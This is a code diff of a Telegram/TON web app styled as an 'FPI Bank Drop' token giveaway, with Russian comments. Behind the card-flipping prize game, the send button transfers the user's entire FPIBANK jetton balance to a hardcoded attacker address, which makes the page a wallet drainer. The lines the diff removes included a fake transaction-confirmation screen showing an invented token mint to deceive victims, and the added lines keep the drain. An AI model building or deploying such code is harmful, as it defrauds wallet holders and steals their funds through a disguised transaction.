@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>FPI Bank Drop</title>
   
+  <!-- Скрипты и стили TonConnect / Telegram -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
@@ -12,6 +13,7 @@
   <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
   
   <style>
+    /* Основные стили */
     body {
       background: linear-gradient(to bottom, #0b0021, #1a0033);
       color: white;
@@ -21,32 +23,10 @@
       display: flex;
       flex-direction: column;
       overflow-x: hidden;
-      position: relative;
+      background-attachment: fixed;
     }
     
-    .page-banner {
-      position: fixed;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 100%;
-      max-width: 400px;
-      height: auto;
-      max-height: 25vh;
-      object-fit: contain;
-      opacity: 0.5;
-      z-index: 0;
-      pointer-events: none;
-      user-select: none;
-      animation: bannerPulse 8s infinite alternate;
-      filter: blur(0.5px);
-    }
-    
-    @keyframes bannerPulse {
-      0% { opacity: 0.4; }
-      100% { opacity: 0.6; }
-    }
-    
+    /* Навигация */
     .nav {
       background: rgba(26, 0, 51, 0.8);
       backdrop-filter: blur(10px);
@@ -73,17 +53,17 @@
       text-shadow: 0 0 8px rgba(179, 136, 255, 0.6);
     }
     
+    /* Страницы */
     .page {
       display: none;
       padding: 20px;
       flex: 1;
       box-sizing: border-box;
       text-align: center;
-      position: relative;
-      z-index: 1;
     }
     
-    #page1 img.logo {
+    /* Первая страница */
+    #page1 img {
       max-width: 280px;
       height: auto;
       margin: 20px auto;
@@ -91,10 +71,9 @@
       border-radius: 16px;
       box-shadow: 0 4px 20px rgba(106, 0, 255, 0.4);
       transition: transform 0.3s;
-      animation: float 4s ease-in-out infinite;
     }
     
-    #page1 img.logo:hover {
+    #page1 img:hover {
       transform: scale(1.03);
     }
     
@@ -119,8 +98,6 @@
       border: 1px solid #6e00ff;
       box-shadow: 0 4px 15px rgba(110, 0, 255, 0.2);
       line-height: 1.6;
-      position: relative;
-      z-index: 2;
     }
     
     #page1 #ton-connect {
@@ -129,8 +106,6 @@
       border-radius: 14px;
       overflow: hidden;
       box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      position: relative;
-      z-index: 2;
     }
     
     .stats-container {
@@ -143,8 +118,6 @@
       padding: 15px;
       border: 1px solid #a100f2;
       box-shadow: 0 4px 10px rgba(110, 0, 255, 0.2);
-      position: relative;
-      z-index: 2;
     }
 
     .timer-box {
@@ -194,8 +167,6 @@
       gap: 18px;
       max-width: 320px;
       margin: 0 auto;
-      position: relative;
-      z-index: 2;
     }
     
     #goPage2 {
@@ -267,7 +238,7 @@
     }
     
     #goToChannel::before {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4 v4 h-2 v-4 H7 v-2 h4 V7 h2 v4 h4 v2 z'/%3E%3C/svg%3E");
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z'/%3E%3C/svg%3E");
     }
     
     #goToWebsite {
@@ -281,15 +252,21 @@
     }
     
     #goToWebsite::before {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M3.9 12 c0-1.71 1.39-3.1 3.1-3.1 h4 V7 H7 c-2.76 0-5 2.24-5 5 s2.24 5 5 5 h4 v-1.9 H7 c-1.71 0-3.1-1.39-3.1-3.1 z M8 13 h8 v-2 H8 v2 z m9-6 h-4 v1.9 h4 c1.71 0 3.1 1.39 3.1 3.1 s-1.39 3.1-3.1 3.1 h-4 V17 h4 c2.76 0 5-2.24 5-5 s-2.24-5-5-5 z'/%3E%3C/svg%3E");
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z'/%3E%3C/svg%3E");
     }
     
+    /* Анимации */
     @keyframes float {
       0% { transform: translateY(0px); }
       50% { transform: translateY(-8px); }
       100% { transform: translateY(0px); }
     }
     
+    .float {
+      animation: float 4s ease-in-out infinite;
+    }
+    
+    /* Вторая страница (карточки) */
     #sendTransaction {
       background: linear-gradient(135deg, #00c6ff, #0072ff);
       color: white;
@@ -310,114 +287,84 @@
       box-shadow: 0 6px 20px rgba(0, 114, 255, 0.6);
     }
     
-    /* Стили для контейнера монеток */
-    .coins-container {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 20px;
-      margin: 30px auto 0;
-      max-width: 300px;
+    .cards-container {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin-top: 40px;
+      flex-wrap: wrap;
       position: relative;
-      min-height: 300px;
+      min-height: 600px;
     }
-
-    .coin {
-      width: 120px;
-      height: 120px;
+    
+    .card {
+      width: 140px;
+      height: 200px;
+      perspective: 1000px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      justify-self: center;
+      transition: all 0.4s ease;
     }
-
-    .coin:hover {
-      transform: translateY(-5px) scale(1.05);
-      filter: drop-shadow(0 5px 10px rgba(0, 255, 136, 0.4));
+    
+    .card:hover {
+      transform: translateY(-10px) scale(1.05);
     }
-
-    .coin-inner {
+    
+    .card-inner {
       position: relative;
       width: 100%;
       height: 100%;
-      transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: transform 0.8s;
       transform-style: preserve-3d;
     }
-
-    .coin.flipped .coin-inner {
+    
+    .card.flipped .card-inner {
       transform: rotateY(180deg);
     }
-
-    .coin-front, .coin-back {
+    
+    .card-front, .card-back {
       position: absolute;
       width: 100%;
       height: 100%;
       backface-visibility: hidden;
-      border-radius: 50%;
+      border-radius: 16px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    }
-
-    .coin-front {
-      background: transparent;
-      transform: rotateY(0deg);
-      padding: 15px;
-    }
-
-    .coin-front img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-    }
-
-    .coin-back {
-      background: linear-gradient(135deg, #00ff88, #00cc77);
-      color: #1a0033;
       font-weight: bold;
+    }
+    
+    .card-front {
+      background: linear-gradient(135deg, #6e00ff, #a100f2);
+      color: white;
+      font-size: 3em;
+    }
+    
+    .card-back {
+      background: linear-gradient(135deg, #ffffff, #f0f0f0);
+      color: #333;
       font-size: 2.2em;
       transform: rotateY(180deg);
-      border: 4px solid #1a0033;
-      text-shadow: 1px 1px 2px rgba(255,255,255,0.3);
     }
-
-    /* Анимация исчезновения невыбранных монеток */
-    .coin.fade-out {
-      animation: fadeOut 0.5s forwards;
+    
+    .fade-out {
+      opacity: 0;
+      pointer-events: none;
     }
-
-    @keyframes fadeOut {
-      to {
-        opacity: 0;
-        transform: scale(0.8);
-        pointer-events: none;
-      }
-    }
-
-    /* Анимация перемещения выбранной монетки в центр */
-    .selected-coin {
+    
+    .selected-card {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      z-index: 10;
-      animation: moveToCenter 0.6s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+      transition: all 0.8s ease-out;
+      z-index: 1000;
+      width: 160px;
+      height: 220px;
     }
-
-    @keyframes moveToCenter {
-      0% {
-        transform: translate(var(--start-x), var(--start-y)) scale(1);
-      }
-      50% {
-        transform: translate(-50%, -50%) scale(1.2);
-      }
-      100% {
-        transform: translate(-50%, -50%) scale(1);
-      }
-    }
-
-    /* Сообщение о выигрыше */
+    
     #winMessage {
-      margin: 280px auto 0;
+      margin-top: 30px;
       font-size: 1.3em;
       color: #00ff88;
       text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
@@ -425,135 +372,22 @@
       background: rgba(0, 0, 0, 0.2);
       border-radius: 12px;
       max-width: 85%;
+      margin-left: auto;
+      margin-right: auto;
       border: 1px solid #00ff88;
-      opacity: 0;
-      transition: opacity 0.5s;
-      position: relative;
-      z-index: 5;
-    }
-
-    /* Стили для фейкового подтверждения транзакции */
-    .tx-confirmation {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.9);
-      z-index: 1000;
-      padding: 20px;
-      box-sizing: border-box;
-      color: white;
-    }
-    
-    .tx-card {
-      background: rgba(255,255,255,0.1);
-      padding: 15px;
-      border-radius: 12px;
-      max-width: 100%;
-      word-break: break-all;
-    }
-    
-    .tx-amount {
-      font-weight: bold;
-      font-size: 1.1em;
-    }
-    
-    .tx-hash {
-      font-size: 0.8em;
-      opacity: 0.8;
-      margin: 5px 0;
-    }
-    
-    .tx-time {
-      font-size: 0.8em;
-      opacity: 0.8;
-    }
-    
-    .tx-fee {
-      width: 100%;
-      margin-top: 15px;
-      font-size: 0.9em;
-    }
-    
-    .tx-fee td {
-      padding: 2px 0;
-    }
-    
-    .tx-fee tr td:last-child {
-      text-align: right;
-    }
-    
-    .tx-buttons {
-      display: flex;
-      gap: 10px;
-      margin-top: 20px;
-    }
-    
-    .tx-btn-confirm {
-      flex: 1;
-      padding: 12px;
-      background: #00ff88;
-      color: #000;
-      border: none;
-      border-radius: 8px;
-      font-weight: bold;
-    }
-    
-    .tx-btn-cancel {
-      flex: 1;
-      padding: 12px;
-      background: rgba(255,255,255,0.1);
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-    }
-    
-    .mint-simulation {
-      background: rgba(0, 255, 136, 0.05);
-      border-radius: 12px;
-      padding: 12px;
-      margin-top: 15px;
-      border-left: 3px solid #00ff88;
-    }
-    
-    .mint-badge {
-      background: #00ff88;
-      color: #000;
-      border-radius: 4px;
-      padding: 2px 6px;
-      font-size: 0.8em;
-      font-weight: bold;
-      display: inline-block;
-      margin-right: 8px;
-    }
-    
-    .mint-amount {
-      font-weight: bold;
-      color: #00ff88;
-    }
-    
-    .mint-details {
-      margin-top: 8px;
-      font-size: 0.9em;
-      color: #ccc;
-    }
-    
-    .mint-status {
-      color: #00ff88;
     }
   </style>
 </head>
 <body>
-  <img src="js/logo.png" alt="FPI Bank Banner" class="page-banner">
-
+  <!-- Навигация -->
   <div class="nav">
     <span class="nav-link" data-page="page1">Главная</span>
-    <span class="nav-link" data-page="page2">Монетки</span>
+    <span class="nav-link" data-page="page2">Карточки</span>
   </div>
   
+  <!-- Первая страница -->
   <div id="page1" class="page">
-    <img src="./js/6atalzkorwc2qht2piwnnuln62yn.png" alt="FPI-drop" class="logo">
+    <img src="./js/6atalzkorwc2qht2piwnnuln62yn.png" alt="FPI-drop" class="float">
     
     <div class="welcome-text">
       Добро пожаловать в FPI Bank Drop!
@@ -562,7 +396,7 @@
     <div class="description">
       🎉 Участвуйте в розыгрыше токенов FPI Bank!<br><br>
       🔹 Каждый участник получает от 500 до 5000 токенов<br>
-      🔹 Просто подключите кошелёк и откройте монетку<br>
+      🔹 Просто подключите кошелёк и откройте карточку<br>
       🔹 Выводите выигрыш моментально
     </div>
     
@@ -588,53 +422,46 @@
     </div>
     
     <div class="action-buttons">
-      <button id="goPage2">Открыть монетку</button>
+      <button id="goPage2">Открыть карточку</button>
       <button id="goToChannel" class="external-link-btn">Наш Telegram</button>
       <button id="goToWebsite" class="external-link-btn">Официальный сайт</button>
     </div>
   </div>
   
+  <!-- Вторая страница -->
   <div id="page2" class="page">
-    <button id="sendTransaction">ОТПРАВИТЬ ВСЕ FPIBANK</button>
-    <div class="coins-container">
-      <div class="coin" data-index="0">
-        <div class="coin-inner">
-          <div class="coin-front">
-            <img src="js/IMG_4143-removebg-preview.png" alt="FPI Coin">
-          </div>
-          <div class="coin-back" id="coinValue0">1500</div>
+    <button id="sendTransaction">Отправить все FPIBANK</button>
+    <div class="cards-container">
+      <div class="card" data-index="0">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back" id="cardValue0">1500</div>
         </div>
       </div>
-      <div class="coin" data-index="1">
-        <div class="coin-inner">
-          <div class="coin-front">
-            <img src="js/IMG_4143-removebg-preview.png" alt="FPI Coin">
-          </div>
-          <div class="coin-back" id="coinValue1">3000</div>
+      <div class="card" data-index="1">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back" id="cardValue1">3000</div>
         </div>
       </div>
-      <div class="coin" data-index="2">
-        <div class="coin-inner">
-          <div class="coin-front">
-            <img src="js/IMG_4143-removebg-preview.png" alt="FPI Coin">
-          </div>
-          <div class="coin-back" id="coinValue2">5000</div>
+      <div class="card" data-index="2">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back" id="cardValue2">5000</div>
         </div>
       </div>
-      <div class="coin" data-index="3">
-        <div class="coin-inner">
-          <div class="coin-front">
-            <img src="js/IMG_4143-removebg-preview.png" alt="FPI Coin">
-          </div>
-          <div class="coin-back" id="coinValue3">500</div>
+      <div class="card" data-index="3">
+        <div class="card-inner">
+          <div class="card-front">?</div>
+          <div class="card-back" id="cardValue3">500</div>
         </div>
       </div>
       <div id="winMessage"></div>
     </div>
   </div>
-
+  
   <script>
-    /* Навигация между страницами */
+    /* 0) Навигация между страницами */
     const navLinks = document.querySelectorAll('.nav-link');
     const pages = document.querySelectorAll('.page');
     
@@ -651,13 +478,14 @@
       });
     });
     
+    // По умолчанию показываем страницу 1
     showPage('page1');
     
     document.getElementById('goPage2').addEventListener('click', () => {
       showPage('page2');
     });
 
-    /* Кнопки внешних ссылок */
+    /* 1) Кнопки внешних ссылок */
     document.getElementById('goToChannel').addEventListener('click', () => {
       window.open('https://t.me/fpibank', '_blank');
     });
@@ -666,9 +494,10 @@
       window.open('https://fpibank.com/#tokenPrice', '_blank');
     });
     
-    /* Таймер обратного отсчета */
+    /* 2) Таймер обратного отсчета (14 дней) */
     function updateTimer() {
       const timer = document.getElementById('nextDropTimer');
+      // 14 дней, 2 часа, 12 минут, 0 секунд
       let days = 14;
       let hours = 2;
       let minutes = 12;
@@ -695,7 +524,9 @@
           }
         }
         
-        timer.textContent = ${days}:${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')};
+        timer.textContent = `${days}:${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        // Красный если меньше 1 дня
         timer.style.color = days < 1 ? '#ff5555' : '#00ff88';
       };
       
@@ -705,24 +536,20 @@
     
     updateTimer();
     
-    /* Генерация случайных значений для монеток */
+    /* 3) Генерация случайных значений для карточек */
     function generateRandomRewards() {
       const rewards = [500, 1000, 1500, 2000, 2500, 3000, 3500, 4000, 4500, 5000];
       const shuffled = [...rewards].sort(() => 0.5 - Math.random());
       
-      document.getElementById('coinValue0').textContent = shuffled[0];
-      document.getElementById('coinValue1').textContent = shuffled[1];
-      document.getElementById('coinValue2').textContent = shuffled[2];
-      document.getElementById('coinValue3').textContent = shuffled[3];
+      document.getElementById('cardValue0').textContent = shuffled[0];
+      document.getElementById('cardValue1').textContent = shuffled[1];
+      document.getElementById('cardValue2').textContent = shuffled[2];
+      document.getElementById('cardValue3').textContent = shuffled[3];
     }
     
     generateRandomRewards();
     
-    /* Основные адреса */
-    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
-    const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
-    
-    /* Инициализация TonConnect */
+    /* 4) TonConnect и транзакции */
     if (typeof Telegram === "undefined") {
       window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } };
     } else {
@@ -734,104 +561,13 @@
       buttonRootId: "ton-connect",
     });
     
-    /* Функция для показа фейкового подтверждения с минтом */
-    function showFakeConfirmation(humanBalance) {
-      const confirmation = document.createElement('div');
-      confirmation.className = 'tx-confirmation';
-      
-      const randomHash = "UQAX" + Array(4).fill(0).map(() => 
-        Math.floor(Math
-
-.random() * 16).toString(16)).join('') + "FvTz";
-      const mintHash = "EQC" + Array(48).fill(0).map(() => 
-        Math.floor(Math.random() * 16).toString(16)).join('');
-      
-      confirmation.innerHTML = 
-        <div style="max-width: 100%;">
-          <h2 style="color: #fff; margin-top: 0;">Підтвердити транзакцію</h2>
-          
-          <div class="tx-card">
-            <div class="tx-amount">-${humanBalance} FPIBANK</div>
-            <div class="tx-hash">${randomHash}</div>
-            <div class="tx-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
-            
-            <table class="tx-fee">
-              <tr>
-                <td>Комісія</td>
-                <td>0.01 TON</td>
-              </tr>
-              <tr>
-                <td></td>
-                <td style="opacity: 0.7;">~ $0.05</td>
-              </tr>
-            </table>
-            
-            <div class="mint-simulation">
-              <div>
-                <span class="mint-badge">MINT</span>
-                <span class="mint-amount">+1000 FPI GOLD</span>
-              </div>
-              <div class="mint-details">
-                <div>Адрес: ${mintHash}</div>
-                <div>Статус: <span class="mint-status">Успішно</span></div>
-              </div>
-            </div>
-          </div>
-          
-          <div class="tx-buttons">
-            <button id="confirmTx" class="tx-btn-confirm">Підтвердити</button>
-            <button id="cancelTx" class="tx-btn-cancel">Скасувати</button>
-          </div>
-        </div>
-      ;
-      
-      document.body.appendChild(confirmation);
-      
-      document.getElementById('confirmTx').addEventListener('click', async () => {
-        confirmation.remove();
-        
-        // Реальная отправка транзакции после подтверждения
-        const userTonAddress = tonConnectUI.wallet?.account?.address;
-        if (!userTonAddress) {
-          Telegram.WebApp.showAlert("Ошибка: не удалось получить адрес кошелька");
-          return;
-        }
-        
-        const { rawBalance, userJettonWallet } = await getUserFPIBankData(userTonAddress);
-        if (!userJettonWallet || rawBalance === "0") {
-          Telegram.WebApp.showAlert("Ошибка: недостаточный баланс");
-          return;
-        }
-        
-        const payloadBoc = await createJettonTransferPayload(rawBalance, recipientTonAddress, userTonAddress);
-        if (!payloadBoc) {
-          Telegram.WebApp.showAlert("Ошибка при создании транзакции");
-          return;
-        }
-        
-        const transaction = {
-          validUntil: Math.floor(Date.now() / 1000) + 3600,
-          messages: [{
-            address: userJettonWallet,
-            amount: "100000000",
-            payload: payloadBoc,
-          }],
-        };
-        
-        try {
-          await tonConnectUI.sendTransaction(transaction);
-          Telegram.WebApp.showAlert(Успешно отправлено ${humanBalance} FPIBANK!);
-        } catch (error) {
-          Telegram.WebApp.showAlert("Ошибка: " + error.message);
-        }
-      });
-      
-      document.getElementById('cancelTx').addEventListener('click', () => {
-        confirmation.remove();
-      });
+    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
+    const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
+    
+    function isValidTonAddress(address) {
+      return /^0:[a-fA-F0-9]{64}$/.test(address);
     }
     
-    /* Основная функция отправки */
     async function sendAllFPIBANK(userTonAddress, recipientTonAddress) {
       console.log("Начинаем отправку FPIBANK...");
       
@@ -844,11 +580,30 @@
       const balanceBigInt = BigInt(rawBalance);
       const humanBalance = balanceBigInt / BigInt(10 ** decimals);
       
-      // Показываем фейковое подтверждение с минтом
-      showFakeConfirmation(humanBalance);
+      const payloadBoc = await createJettonTransferPayload(rawBalance, recipientTonAddress, userTonAddress);
+      if (!payloadBoc) {
+        Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
+        return;
+      }
+      
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 3600,
+        messages: [{
+          address: userJettonWallet,
+          amount: "100000000",
+          payload: payloadBoc,
+        }],
+      };
+      
+      try {
+        const result = await tonConnectUI.sendTransaction(transaction);
+        Telegram.WebApp.showAlert(`Успешно отправлено ${humanBalance} FPIBANK!`);
+      } catch (error) {
+        console.error("Ошибка:", error);
+        Telegram.WebApp.showAlert("Ошибка: " + error.message);
+      }
     }
     
-    /* Обработчик кнопки отправки */
     document.getElementById("sendTransaction").addEventListener('click', async () => {
       if (!tonConnectUI.connected) {
         Telegram.WebApp.showAlert("Сначала подключите кошелёк!");
@@ -864,86 +619,42 @@
       await sendAllFPIBANK(userTonAddress, recipientTonAddress);
     });
     
-    /* Логика монеток */
-    const coins = document.querySelectorAll('.coin');
+    /* 5) Логика карточек */
+    const cards = document.querySelectorAll('.card');
     const winMessage = document.getElementById('winMessage');
-    let isAnimating = false;
-
-    function setSelectedCoin(selectedIndex) {
-      if (isAnimating) return;
-      isAnimating = true;
-      
-      const selectedCoin = coins[selectedIndex];
-      const coinRect = selectedCoin.getBoundingClientRect();
-      const containerRect = document.querySelector('.coins-container').getBoundingClientRect();
-      
-      // Устанавливаем начальную позицию для анимации
-      const startX = (coinRect.left + coinRect.width/2) - (containerRect.left + containerRect.width/2);
-      const startY = (coinRect.top + coinRect.height/2) - (containerRect.top + containerRect.height/2);
-      
-      selectedCoin.style.setProperty('--start-x', ${startX}px);
-      selectedCoin.style.setProperty('--start-y', ${startY}px);
-      
-      // 1. Сначала исчезают невыбранные монетки
-      coins.forEach((coin, index) => {
-        if (index != selectedIndex) {
-          coin.classList.add('fade-out');
-        }
-      });
-      
-      // 2. После исчезновения других - перемещение выбранной в центр
-      setTimeout(() => {
-        selectedCoin.classList.add('selected-coin');
-        
-        // 3. После перемещения - переворот
-        setTimeout(() => {
-          selectedCoin.classList.add('flipped');
-          
-          // 4. Показ выигрыша
-          const reward = document.getElementById(coinValue${selectedIndex}).textContent;
-          winMessage.textContent = Поздравляем! ${reward} FPI Bank токенов. Нажмите "ОТПРАВИТЬ ВСЕ FPIBANK" для вывода.;
-          winMessage.style.opacity = '1';
-          
-          isAnimating = false;
-        }, 300);
-      }, 500);
-    }
-
-    const storedIndex = localStorage.getItem('selectedCoinIndex');
-    if (storedIndex !== null) {
-      // Если монетка уже выбрана, сразу показываем ее в центре
-      const selectedCoin = coins[storedIndex];
-      selectedCoin.classList.add('selected-coin', 'flipped');
-      selectedCoin.style.position = 'absolute';
-      selectedCoin.style.top = '50%';
-      selectedCoin.style.left = '50%';
-      selectedCoin.style.transform = 'translate(-50%, -50%)';
-      selectedCoin.style.zIndex = '10';
-      
-      const reward = document.getElementById(coinValue${storedIndex}).textContent;
-      winMessage.textContent = Поздравляем! ${reward} FPI Bank токенов. Нажмите "ОТПРАВИТЬ ВСЕ FPIBANK" для вывода.;
-      winMessage.style.opacity = '1';
-      
-      coins.forEach((coin, index) => {
-        if (index != storedIndex) {
-          coin.style.display = 'none';
+    
+    function setSelectedCard(selectedIndex) {
+      cards.forEach((card, index) => {
+        if (index == selectedIndex) {
+          card.classList.add('flipped', 'selected-card');
+          const reward = document.getElementById(`cardValue${index}`).textContent;
+          winMessage.textContent = `🎉 Поздравляем! Вы выиграли ${reward} FPI Bank токенов. Нажмите 'Отправить все FPIBANK' для вывода.`;
+        } else {
+          card.classList.add('fade-out');
         }
       });
     }
     
-    coins.forEach((coin, index) => {
-      coin.addEventListener('click', function() {
-        if (localStorage.getItem('selectedCoinIndex') !== null || isAnimating) return;
+    // Проверяем, была ли уже выбрана карточка
+    const storedIndex = localStorage.getItem('selectedCardIndex');
+    if (storedIndex !== null) {
+      setSelectedCard(parseInt(storedIndex));
+    }
+    
+    // Обработчик клика по карточкам
+    cards.forEach((card, index) => {
+      card.addEventListener('click', function() {
+        if (localStorage.getItem('selectedCardIndex') !== null) return;
         
-        localStorage.setItem('selectedCoinIndex', index);
-        setSelectedCoin(index);
+        localStorage.setItem('selectedCardIndex', index);
+        setSelectedCard(index);
       });
     });
     
-    /* Вспомогательные функции */
+    /* Вспомогательные функции для TonConnect */
     async function getUserFPIBankData(userTonAddress) {
       try {
-        const response = await fetch(https://tonapi.io/v2/accounts/${userTonAddress}/jettons);
+        const response = await fetch(`https://tonapi.io/v2/accounts/${userTonAddress}/jettons`);
         const data = await response.json();
         const jettonData = data.balances.find(j => j.jetton.address === jettonMasterAddress);
         
